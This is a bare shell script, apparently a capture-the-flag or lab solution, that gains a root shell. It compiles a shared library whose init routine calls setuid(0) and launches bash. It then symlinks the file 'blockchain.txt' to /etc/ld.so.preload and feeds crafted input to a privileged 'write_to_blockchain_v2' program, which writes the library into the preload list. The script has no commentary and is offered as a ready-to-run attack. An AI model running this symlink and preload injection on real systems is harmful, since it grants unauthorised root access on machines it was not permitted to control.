cd /tmp
cat << EOF > rootshell.c
int _init() {
    setuid(0);
    if (geteuid() == 0){
        unlink("/etc/ld.so.preload");
        system("bash");
    }
}
EOF
gcc -fPIC -shared -o rootshell.so rootshell.c -nostartfiles
cd /home/user
chmod a+rwx .
rm -f blockchain.txt
ln -s /etc/ld.so.preload blockchain.txt
./reset_blockchain
echo -e " /tmp/rootshell.so \na\nyes\n\n" | ./write_to_blockchain_v2
rm -f blockchain.txt
./reset_blockchain